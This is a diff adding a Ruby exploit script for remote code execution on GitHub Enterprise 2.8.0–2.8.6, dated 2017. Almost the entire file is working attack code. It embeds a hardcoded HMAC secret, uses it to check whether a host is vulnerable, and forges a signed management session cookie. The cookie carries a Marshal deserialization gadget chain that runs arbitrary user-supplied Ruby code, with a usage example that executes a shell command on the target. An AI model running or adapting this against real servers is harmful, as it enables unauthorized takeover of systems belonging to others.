@@ -1,0 +1,102 @@
+#!/usr/bin/ruby
+require "openssl"
+require "cgi"
+require "net/http"
+require "uri"
+
+SECRET = "641dd6454584ddabfed6342cc66281fb"
+
+puts '                     ___.   .__                 '
+puts '  ____ ___  ________ \_ |__ |  |  __ __   ____  '
+puts '_/ __ \\\\  \/  /\__  \ | __ \|  | |  |  \_/ __ \ '
+puts '\  ___/ >    <  / __ \| \_\ \  |_|  |  /\  ___/ '
+puts ' \___  >__/\_ \(____  /___  /____/____/  \___  >'
+puts '     \/      \/     \/    \/                 \/ '
+puts ''
+puts "github Enterprise RCE exploit"
+puts "Vulnerable: 2.8.0 - 2.8.6"
+puts "(C) 2017 iblue <iblue@exablue.de>"
+
+unless ARGV[0] && ARGV[1]
+  puts "Usage: ./exploit.rb <hostname> <valid ruby code>"
+  puts ""
+  puts "Example: ./exploit.rb ghe.example.org \"%x(id > /tmp/pwned)\""
+  exit 1
+end
+
+hostname = ARGV[0]
+code = ARGV[1]
+
+# First we get the cookie from the host to check if the instance is vulnerable.
+puts "[+] Checking if #{hostname} is vulnerable..."
+
+http = Net::HTTP.new(hostname, 8443)
+http.use_ssl = true
+http.verify_mode = OpenSSL::SSL::VERIFY_NONE # We may deal with self-signed certificates
+
+rqst = Net::HTTP::Get.new("/")
+
+while res = http.request(rqst)
+  case res
+  when Net::HTTPRedirection then
+    puts "  => Following redirect to #{res["location"]}..."
+    rqst = Net::HTTP::Get.new(res["location"])
+  else
+    break
+  end
+end
+
+def not_vulnerable
+  puts "  => Host is not vulnerable"
+  exit 1
+end
+
+unless res['Set-Cookie'] =~ /\A_gh_manage/
+  not_vulnerable
+end
+
+# Parse the cookie
+begin
+  value = res['Set-Cookie'].split("=", 2)[1]
+  data = CGI.unescape(value.split("--").first)
+  hmac = value.split("--").last.split(";", 2).first
+  expected_hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, SECRET, data)
+  not_vulnerable if expected_hmac != hmac
+rescue
+  not_vulnerable
+end
+
+puts "  => Host is vulnerable"
+
+# Now construct the cookie
+puts "[+] Assembling magic cookie..."
+
+# Stubs, since we don't want to execute the code locally.
+module Erubis;class Eruby;end;end
+module ActiveSupport;module Deprecation;class DeprecatedInstanceVariableProxy;end;end;end
+
+erubis = Erubis::Eruby.allocate
+erubis.instance_variable_set :@src, "#{code}; 1"
+proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
+proxy.instance_variable_set :@instance, erubis
+proxy.instance_variable_set :@method, :result
+proxy.instance_variable_set :@var, "@result"
+
+session = {"session_id" => "", "exploit" => proxy}
+
+# Marshal session
+dump = [Marshal.dump(session)].pack("m")
+hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, SECRET, dump)
+
+puts "[+] Sending cookie..."
+
+rqst = Net::HTTP::Get.new("/")
+rqst['Cookie'] = "_gh_manage=#{CGI.escape("#{dump}--#{hmac}")}"
+
+res = http.request(rqst)
+
+if res.code == "302"
+  puts "  => Code executed."
+else
+  puts "  => Something went wrong."
+end
